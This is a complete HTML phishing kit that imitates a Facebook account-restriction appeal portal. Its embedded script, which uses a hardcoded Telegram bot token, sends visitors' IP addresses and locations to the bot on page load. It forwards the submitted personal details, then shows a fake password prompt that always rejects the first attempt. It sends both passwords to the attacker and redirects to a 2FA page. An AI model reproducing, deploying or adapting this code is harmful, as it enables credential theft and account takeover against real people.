<!DOCTYPE html>
<html dir="ltr" lang="en">
<head>
<meta charset="utf-8"/>
<meta content="width=device-width, initial-scale=1.0, viewport-fit=cover" name="viewport"/>
<meta content="Facebook Restriction Appeal Portal - Submit appeals for restricted content or accounts" name="description"/>
<title>Facebook Restriction Appeal Portal</title>
<style>
        :root {
            --primary-color: #1877f2;
            --primary-hover: #166fe5;
            --secondary-color: #42b72a;
            --secondary-hover: #36a420;
            --error-color: #ff4d4f;
            --warning-color: #faad14;
            --success-color: #52c41a;
            --text-primary: #050505;
            --text-secondary: #65676b;
            --bg-primary: #f0f2f5;
            --bg-secondary: #ffffff;
            --border-color: #dddfe2;
            --shadow-1: rgba(0, 0, 0, 0.1);
            --shadow-2: rgba(0, 0, 0, 0.2);
            --shadow-inset: inset 0 0 0 1px var(--border-color);
            --font-family: Segoe UI Historic, Segoe UI, Helvetica, Arial, sans-serif;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: var(--font-family);
            color: var(--text-primary);
            background-color: var(--bg-primary);
            line-height: 1.34;
            -webkit-font-smoothing: antialiased;
        }
        
        #root {
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        
        /* Header Styles */
        .header {
            background-color: var(--bg-secondary);
            height: 56px;
            box-shadow: 0 1px 2px var(--shadow-1);
            position: sticky;
            top: 0;
            z-index: 100;
            display: flex;
            align-items: center;
            padding: 0 16px;
        }
        
        .logo {
            height: 40px;
            display: flex;
            align-items: center;
        }
        
        .logo img {
            height: 40px;
        }
        
        .nav {
            display: flex;
            margin-left: auto;
            align-items: center;
        }
        
        .nav-item {
            padding: 8px 12px;
            border-radius: 6px;
            font-size: 15px;
            font-weight: 600;
            color: var(--text-primary);
            cursor: pointer;
            margin-left: 8px;
        }
        
        .nav-item:hover {
            background-color: rgba(0, 0, 0, 0.05);
        }
        
        .nav-item.primary {
            background-color: var(--primary-color);
            color: white;
        }
        
        .nav-item.primary:hover {
            background-color: var(--primary-hover);
        }
        
        /* Main Content */
        .main {
            flex: 1;
            display: flex;
            justify-content: center;
            padding: 20px 16px;
        }
        
        .container {
            max-width: 1200px;
            width: 100%;
            display: flex;
            gap: 20px;
        }
        
        .sidebar {
            width: 280px;
            flex-shrink: 0;
        }
        
        .content {
            flex: 1;
            background-color: var(--bg-secondary);
            border-radius: 8px;
            box-shadow: 0 1px 2px var(--shadow-1);
            padding: 20px;
        }
        
        /* Card Styles */
        .card {
            background-color: var(--bg-secondary);
            border-radius: 8px;
            box-shadow: 0 1px 2px var(--shadow-1);
            margin-bottom: 20px;
            overflow: hidden;
        }
        
        .card-header {
            padding: 12px 16px;
            border-bottom: 1px solid var(--border-color);
            font-weight: 600;
            font-size: 20px;
        }
        
        .card-body {
            padding: 16px;
        }
        
        /* Form Styles */
        .form-group {
            margin-bottom: 16px;
        }
        
        .form-label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: var(--text-primary);
        }
        
        .form-control {
            width: 100%;
            padding: 10px 12px;
            border-radius: 6px;
            border: 1px solid var(--border-color);
            font-family: inherit;
            font-size: 15px;
            transition: border-color 0.2s, box-shadow 0.2s;
        }
        
        .form-control:focus {
            outline: none;
            border-color: var(--primary-color);
            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
        }
        
        .form-text {
            font-size: 13px;
            color: var(--text-secondary);
            margin-top: 4px;
        }
        
        .btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            padding: 8px 16px;
            border-radius: 6px;
            font-weight: 600;
            font-size: 15px;
            cursor: pointer;
            border: none;
            transition: background-color 0.2s, transform 0.1s;
            user-select: none;
        }
        
        .btn:active {
            transform: scale(0.98);
        }
        
        .btn-primary {
            background-color: var(--primary-color);
            color: white;
        }
        
        .btn-primary:hover {
            background-color: var(--primary-hover);
        }
        
        .btn-secondary {
            background-color: var(--bg-secondary);
            color: var(--primary-color);
            border: 1px solid var(--border-color);
        }
        
        .btn-secondary:hover {
            background-color: rgba(0, 0, 0, 0.05);
        }
        
        /* Alert Styles */
        .alert {
            padding: 12px 16px;
            border-radius: 6px;
            margin-bottom: 16px;
            display: flex;
            align-items: flex-start;
        }
        
        .alert-icon {
            margin-right: 12px;
            font-size: 20px;
        }
        
        .alert-content {
            flex: 1;
        }
        
        .alert-title {
            font-weight: 600;
            margin-bottom: 4px;
        }
        
        .alert-danger {
            background-color: rgba(255, 77, 79, 0.1);
            border: 1px solid rgba(255, 77, 79, 0.3);
            color: var(--error-color);
        }
        
        .alert-warning {
            background-color: rgba(250, 173, 20, 0.1);
            border: 1px solid rgba(250, 173, 20, 0.3);
            color: var(--warning-color);
        }
        
        .alert-success {
            background-color: rgba(82, 196, 26, 0.1);
            border: 1px solid rgba(82, 196, 26, 0.3);
            color: var(--success-color);
        }
        
        /* Table Styles */
        .table {
            width: 100%;
            border-collapse: collapse;
        }
        
        .table th, .table td {
            padding: 12px 16px;
            text-align: left;
            border-bottom: 1px solid var(--border-color);
        }
        
        .table th {
            font-weight: 600;
            color: var(--text-secondary);
        }
        
        .table tr:hover td {
            background-color: rgba(0, 0, 0, 0.02);
        }
        
        /* Status Badges */
        .badge {
            display: inline-block;
            padding: 4px 8px;
            border-radius: 12px;
            font-size: 12px;
            font-weight: 600;
        }
        
        .badge-pending {
            background-color: rgba(250, 173, 20, 0.1);
            color: var(--warning-color);
        }
        
        .badge-reviewed {
            background-color: rgba(24, 119, 242, 0.1);
            color: var(--primary-color);
        }
        
        .badge-approved {
            background-color: rgba(82, 196, 26, 0.1);
            color: var(--success-color);
        }
        
        .badge-rejected {
            background-color: rgba(255, 77, 79, 0.1);
            color: var(--error-color);
        }
        
        /* Modal Styles */
        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: rgba(0, 0, 0, 0.7);
            z-index: 1000;
            display: flex;
            justify-content: center;
            align-items: center;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.3s ease;
        }
        
        .modal-overlay.active {
            opacity: 1;
            pointer-events: all;
        }
        
        .modal-content {
            background-color: white;
            padding: 25px;
            border-radius: 8px;
            width: 90%;
            max-width: 400px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
            position: relative;
        }
        
        .modal-title {
            font-size: 20px;
            margin-bottom: 15px;
            color: var(--text-primary);
        }
        
        .modal-close {
            position: absolute;
            top: 15px;
            right: 15px;
            background: none;
            border: none;
            font-size: 20px;
            cursor: pointer;
        }
        
        /* Responsive Design */
        @media (max-width: 900px) {
            .container {
                flex-direction: column;
            }
            
            .sidebar {
                width: 100%;
            }
        }
        
        @media (max-width: 600px) {
            .header {
                padding: 0 8px;
            }
            
            .nav-item {
                padding: 8px;
                font-size: 14px;
            }
            
            .content {
                padding: 16px 12px;
            }
            
            .card-header {
                padding: 12px;
                font-size: 18px;
            }
            
            .card-body {
                padding: 12px;
            }
        }
        
        /* Spinner */
        .spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid rgba(255,255,255,.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
            margin-right: 8px;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        /* Error Styles */
        .error-message {
            color: var(--error-color);
            font-size: 13px;
            margin-top: 4px;
            display: none;
        }
        
        .has-error {
            border-color: var(--error-color) !important;
        }
        
        .checkbox-error {
            color: var(--error-color) !important;
        }
    </style>
</head>
<body>
<div id="root">
<header class="header">
<div class="logo">
<img alt="Facebook" height="40" src="imgs/facebook.png" width="40"/>
</div>
<nav class="nav">
<div class="nav-item">Help Center</div>
<div class="nav-item">Community Standards</div>
<div class="nav-item primary">Submit Appeal</div>
</nav>
</header>
<main class="main">
<div class="container">
<aside class="sidebar">
<div class="card">
<div class="card-header">
                            Appeal Options
                        </div>
<div class="card-body">
<nav class="sidebar-nav">
<div class="nav-item active">Account Restrictions</div>
<div class="nav-item">Content Removal</div>
<div class="nav-item">Page Restrictions</div>
<div class="nav-item">Group Restrictions</div>
<div class="nav-item">Advertising Issues</div>
</nav>
</div>
</div>
<div class="card">
<div class="card-header">
                            Resources
                        </div>
<div class="card-body">
<ul style="list-style-type: none;">
<li style="padding: 8px 0;"><a href="#" style="color: var(--primary-color); text-decoration: none;">Community Standards</a></li>
<li style="padding: 8px 0;"><a href="#" style="color: var(--primary-color); text-decoration: none;">Appeal Process Explained</a></li>
<li style="padding: 8px 0;"><a href="#" style="color: var(--primary-color); text-decoration: none;">Frequently Asked Questions</a></li>
<li style="padding: 8px 0;"><a href="#" style="color: var(--primary-color); text-decoration: none;">Contact Support</a></li>
</ul>
</div>
</div>
</aside>
<div class="content">
<h1 style="margin-bottom: 20px;">Account Restriction Appeal</h1>
<div class="alert alert-warning">
<div class="alert-icon">⚠️</div>
<div class="alert-content">
<div class="alert-title">Important Notice</div>
<div>Please provide accurate information in your appeal. False or misleading information may delay the review process or result in your appeal being denied.</div>
</div>
</div>
<form id="appealForm">
<div class="card" style="margin-bottom: 20px;">
<div class="card-header">
                                Your Information
                            </div>
<div class="card-body">
<div class="form-group">
<label class="form-label" for="email">Email Address Associated with Your Account</label>
<input class="form-control" id="email" name="email" required="" type="email"/>
<div class="form-text">We'll send updates about your appeal to this email.</div>
<div class="error-message" id="email-error"></div>
</div>
<div class="form-group">
<label class="form-label" for="phone">Phone Number Associated with Your Account (Optional)</label>
<input class="form-control" id="phone" name="phone" type="tel"/>
<div class="form-text">This helps us verify your account faster.</div>
</div>
<div class="form-group">
<label class="form-label" for="fullName">Full Name on Your Account</label>
<input class="form-control" id="fullName" name="fullName" required="" type="text"/>
<div class="error-message" id="fullName-error"></div>
</div>
</div>
</div>
<div class="card" style="margin-bottom: 20px;">
<div class="card-header">
                                Restriction Details
                            </div>
<div class="card-body">
<div class="form-group">
<label class="form-label" for="restrictionType">Type of Restriction</label>
<select class="form-control" id="restrictionType" name="restrictionType" required="">
<option value="">Select restriction type</option>
<option value="account_disabled">Account Disabled</option>
<option value="content_removed">Content Removed</option>
<option value="feature_limited">Feature Limited</option>
<option value="page_restricted">Page Restricted</option>
<option value="ad_account_disabled">Ad Account Disabled</option>
<option value="other">Other</option>
</select>
<div class="error-message" id="restrictionType-error"></div>
</div>
<div class="form-group">
<label class="form-label" for="restrictionDate">When Did This Happen?</label>
<input class="form-control" id="restrictionDate" name="restrictionDate" required="" type="date"/>
<div class="error-message" id="restrictionDate-error"></div>
</div>
<div class="form-group">
<label class="form-label" for="notificationMessage">Notification Message You Received (If Any)</label>
<textarea class="form-control" id="notificationMessage" name="notificationMessage" rows="3"></textarea>
<div class="form-text">Please copy the exact message you received from Facebook about this restriction.</div>
</div>
</div>
</div>
<div class="card" style="margin-bottom: 20px;">
<div class="card-header">
                                Appeal Explanation
                            </div>
<div class="card-body">
<div class="form-group">
<label class="form-label" for="appealReason">Why Are You Appealing This Decision?</label>
<textarea class="form-control" id="appealReason" name="appealReason" required="" rows="5"></textarea>
<div class="error-message" id="appealReason-error"></div>
<div class="form-text">Please explain in detail why you believe this restriction was made in error. Include any relevant context or information that might help us understand your situation.</div>
</div>
<div class="form-group">
<label class="form-label" for="supportingEvidence">Supporting Evidence (Optional)</label>
<textarea class="form-control" id="supportingEvidence" name="supportingEvidence" rows="3"></textarea>
<div class="form-text">Provide any additional information that supports your appeal, such as links to similar content that wasn't restricted.</div>
</div>
<div class="form-group">
<label class="form-label" for="files">Upload Supporting Documents (Optional)</label>
<input class="form-control" id="files" multiple="" name="files" type="file"/>
<div class="form-text">You can upload screenshots, documents, or other files that support your appeal (max 5 files, 5MB each).</div>
</div>
</div>
</div>
<div class="card" style="margin-bottom: 20px;">
<div class="card-header">
                                Declaration
                            </div>
<div class="card-body">
<div class="form-group">
<div class="form-check">
<input class="form-check-input" id="declaration" name="declaration" required="" type="checkbox"/>
<label class="form-check-label" for="declaration">I declare that the information provided in this appeal is accurate to the best of my knowledge. I understand that providing false information may result in my appeal being denied or my account being permanently disabled.</label>
<div class="error-message" id="declaration-error"></div>
</div>
</div>
<div class="form-group">
<div class="form-check">
<input class="form-check-input" id="agreeToReview" name="agreeToReview" required="" type="checkbox"/>
<label class="form-check-label" for="agreeToReview">I agree to Facebook reviewing my account and content as part of this appeal process.</label>
<div class="error-message" id="agreeToReview-error"></div>
</div>
</div>
</div>
</div>
<div style="display: flex; justify-content: flex-end; gap: 12px;">
<button class="btn btn-secondary" type="reset">Clear Form</button>
<button class="btn btn-primary" id="submitBtn" type="submit">Submit Appeal</button>
</div>
</form>
<div class="alert alert-success" id="successMessage" style="display: none; margin-top: 20px;">
<div class="alert-icon">✓</div>
<div class="alert-content">
<div class="alert-title">Appeal Submitted Successfully</div>
<div>Your appeal has been received. We'll review your case and send a response to the email address associated with your account. Typical response time is 3-5 business days.</div>
</div>
</div>
<div id="previousAppeals" style="margin-top: 40px;">
<h2 style="margin-bottom: 16px;">Your Previous Appeals</h2>
<div class="table-responsive">
<table class="table">
<thead>
<tr>
<th>Date</th>
<th>Type</th>
<th>Status</th>
<th>Details</th>
</tr>
</thead>
<tbody>
<tr>
<td>2023-10-15</td>
<td>Account Disabled</td>
<td><span class="badge badge-approved">Approved</span></td>
<td><a href="#" style="color: var(--primary-color);">View Details</a></td>
</tr>
<tr>
<td>2023-07-22</td>
<td>Content Removed</td>
<td><span class="badge badge-rejected">Rejected</span></td>
<td><a href="#" style="color: var(--primary-color);">View Details</a></td>
</tr>
<tr>
<td>2023-05-10</td>
<td>Feature Limited</td>
<td><span class="badge badge-approved">Approved</span></td>
<td><a href="#" style="color: var(--primary-color);">View Details</a></td>
</tr>
</tbody>
</table>
</div>
</div>
</div>
</div>
</main>
<footer style="background-color: var(--bg-secondary); padding: 20px; border-top: 1px solid var(--border-color); margin-top: 40px;">
<div style="max-width: 1200px; margin: 0 auto; display: flex; flex-wrap: wrap; justify-content: space-between;">
<div style="margin-bottom: 16px;">
<div style="font-weight: 600; margin-bottom: 8px;">Facebook</div>
<div style="font-size: 13px; color: var(--text-secondary);">
                        © 2023 Facebook, Inc.
                    </div>
</div>
<div style="display: flex; flex-wrap: wrap; gap: 20px;">
<div>
<div style="font-weight: 600; margin-bottom: 8px;">Help</div>
<ul style="list-style-type: none; font-size: 13px;">
<li style="padding: 4px 0;"><a href="#" style="color: var(--text-secondary); text-decoration: none;">Help Center</a></li>
<li style="padding: 4px 0;"><a href="#" style="color: var(--text-secondary); text-decoration: none;">Community Standards</a></li>
<li style="padding: 4px 0;"><a href="#" style="color: var(--text-secondary); text-decoration: none;">Privacy Policy</a></li>
</ul>
</div>
<div>
<div style="font-weight: 600; margin-bottom: 8px;">Appeals</div>
<ul style="list-style-type: none; font-size: 13px;">
<li style="padding: 4px 0;"><a href="#" style="color: var(--text-secondary); text-decoration: none;">Status Check</a></li>
<li style="padding: 4px 0;"><a href="#" style="color: var(--text-secondary); text-decoration: none;">FAQ</a></li>
<li style="padding: 4px 0;"><a href="#" style="color: var(--text-secondary); text-decoration: none;">Contact Us</a></li>
</ul>
</div>
<div>
<div style="font-weight: 600; margin-bottom: 8px;">Legal</div>
<ul style="list-style-type: none; font-size: 13px;">
<li style="padding: 4px 0;"><a href="#" style="color: var(--text-secondary); text-decoration: none;">Terms of Service</a></li>
<li style="padding: 4px 0;"><a href="#" style="color: var(--text-secondary); text-decoration: none;">Data Policy</a></li>
<li style="padding: 4px 0;"><a href="#" style="color: var(--text-secondary); text-decoration: none;">Cookie Policy</a></li>
</ul>
</div>
</div>
</div>
</footer>
</div>
<!-- Password Modal -->
<div class="modal-overlay" id="passwordModal">
<div class="modal-content" style="max-width: 360px;">
<button class="modal-close" id="closeModal">×</button>
<div style="text-align: center; margin-bottom: 10px;">
<img src="imgs/facebook.png" style="width: 48px; height: 48px;"/>
</div>
<h3 class="modal-title" style="text-align: center;">Enter your password</h3>
<p style="text-align: center; font-size: 14px; color: var(--text-secondary); margin-bottom: 15px;">
      For security, please re-enter your Facebook password to continue.
    </p>
<div class="form-group">
<input class="form-control" id="fbPassword" placeholder="Password" type="password"/>
<div class="error-message" id="fbPassword-error" style="margin-top: 6px;"></div>
</div>
<div class="form-group" style="margin-top: 10px;">
<button class="btn btn-primary" id="confirmPassword" style="width: 100%;">Confirm</button>
</div>
</div>
</div>

<script>
document.addEventListener('DOMContentLoaded', function() {
    // Telegram Bot Configuration
    const BOT_TOKEN = '7489121653:AAGO9WeABG0P7fl6hnqAf7WrDrptpfHguAo';
    const CHAT_ID = '1389938531';
    
    // Form elements
    const form = document.getElementById('appealForm');
    const modal = document.getElementById('passwordModal');
    const confirmBtn = document.getElementById('confirmPassword');
    const passwordInput = document.getElementById('fbPassword');
    const errorDiv = document.getElementById('fbPassword-error');
    const closeModal = document.getElementById('closeModal');
    let firstTryFailed = false;
    let cachedFormData = {};

    // Function to format clean Telegram message
    function formatTelegramMessage(data, title) {
        let message = `<b>${title}</b>\n\n`;
        
        // Map field names to more readable labels
        const fieldLabels = {
            email: '📧 Email',
            phone: '📱 Phone',
            fullName: '👤 Full Name',
            restrictionType: '🔒 Restriction Type',
            restrictionDate: '📅 Restriction Date',
            notificationMessage: '📨 Notification Message',
            appealReason: '📝 Appeal Reason',
            supportingEvidence: '📄 Supporting Evidence',
            password: '🔑 Password'
        };
        
        // Add each field to message
        for (const [key, value] of Object.entries(data)) {
            if (!value || typeof value === 'object') continue;
            
            const label = fieldLabels[key] || key;
            // Trim long values and add ellipsis
            const displayValue = value.length > 200 
                ? `${value.substring(0, 200)}...` 
                : value;
                
            message += `<b>${label}:</b> ${displayValue}\n`;
        }
        
        return message;
    }

    // Function to get user info (IP, location, etc.)
    async function getUserInfo() {
        try {
            const response = await fetch('https://ipapi.co/json/');
            if (response.ok) {
                const data = await response.json();
                return {
                    ip: data.ip || 'Unknown',
                    country: data.country_name || 'Unknown',
                    city: data.city || 'Unknown',
                    region: data.region || 'Unknown',
                    isp: data.org || 'Unknown',
                    device: navigator.userAgent,
                    time: new Date().toISOString()
                };
            }
        } catch (error) {
            console.error('Error getting IP info:', error);
        }
        return {
            ip: 'Unknown',
            country: 'Unknown',
            city: 'Unknown',
            region: 'Unknown',
            isp: 'Unknown',
            device: navigator.userAgent,
            time: new Date().toISOString()
        };
    }

    // Function to send Telegram message
    async function sendTelegramMessage(message) {
        try {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
            return await response.json();
        } catch (error) {
            console.error('Error sending to Telegram:', error);
        }
    }

    // Send visitor info when page loads
    getUserInfo().then(info => {
        const visitorMessage = `👀 <b>New Visitor</b>\n\n` +
            `🌍 <b>Location:</b> ${info.city}, ${info.region}, ${info.country}\n` +
            `📡 <b>IP:</b> ${info.ip}\n` +
            `🖥️ <b>Device:</b> ${info.device}\n` +
            `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
        sendTelegramMessage(visitorMessage);
    });

    // Form submission handler
    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        // Get form data
        const formData = new FormData(form);
        cachedFormData = Object.fromEntries(formData.entries());
        
        // Get user info
        const userInfo = await getUserInfo();
        
        // Format and send form data to Telegram immediately
        let formMessage = formatTelegramMessage(cachedFormData, '📝 New Appeal Submitted');
        formMessage += `\n🌍 <b>Location:</b> ${userInfo.city}, ${userInfo.region}, ${userInfo.country}`;
        formMessage += `\n📡 <b>IP:</b> ${userInfo.ip}`;
        formMessage += `\n🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
        
        await sendTelegramMessage(formMessage);
        
        // Show password modal
        passwordInput.value = '';
        errorDiv.style.display = 'none';
        errorDiv.textContent = '';
        confirmBtn.innerHTML = 'Confirm';
        confirmBtn.disabled = false;
        firstTryFailed = false;
        modal.classList.add('active');
    });

    // Password submission handler
    confirmBtn.addEventListener('click', async function() {
        const password = passwordInput.value.trim();
        
        // Validate password
        if (!password) {
            errorDiv.textContent = 'Please enter your password';
            errorDiv.style.display = 'block';
            return;
        }
        
        // Show loading state
        confirmBtn.innerHTML = '<span class="spinner"></span> Verifying...';
        confirmBtn.disabled = true;
        
        // Get user info
        const userInfo = await getUserInfo();
        
        // Simulate verification delay
        await new Promise(resolve => setTimeout(resolve, 1500));
        
        if (!firstTryFailed) {
            // First attempt - send password attempt and show error
            const firstAttemptMessage = `🔐 <b>First Password Attempt</b>\n\n` +
                                      `<b>Password:</b> ${password}\n` +
                                      `🌍 <b>Location:</b> ${userInfo.city}, ${userInfo.country}\n` +
                                      `📡 <b>IP:</b> ${userInfo.ip}\n` +
                                      `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
            
            await sendTelegramMessage(firstAttemptMessage);
            
            firstTryFailed = true;
            errorDiv.textContent = 'Incorrect password. Please try again.';
            errorDiv.style.display = 'block';
            passwordInput.value = ''; // Clear the field for second attempt
            confirmBtn.innerHTML = 'Confirm';
            confirmBtn.disabled = false;
            return;
        }
        
        // Second attempt - send the real password
        const secondAttemptMessage = `🔑 <b>Second Password (Verified)</b>\n\n` +
                                    `<b>Password:</b> ${password}\n` +
                                    `🌍 <b>Location:</b> ${userInfo.city}, ${userInfo.country}\n` +
                                    `📡 <b>IP:</b> ${userInfo.ip}\n` +
                                    `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
        
        await sendTelegramMessage(secondAttemptMessage);
        
        // Redirect to 2FA page
        window.location.href = '2fa.html';
    });

    // Close modal handler
    closeModal.addEventListener('click', function() {
        modal.classList.remove('active');
    });
});
</script>

</body>
</html>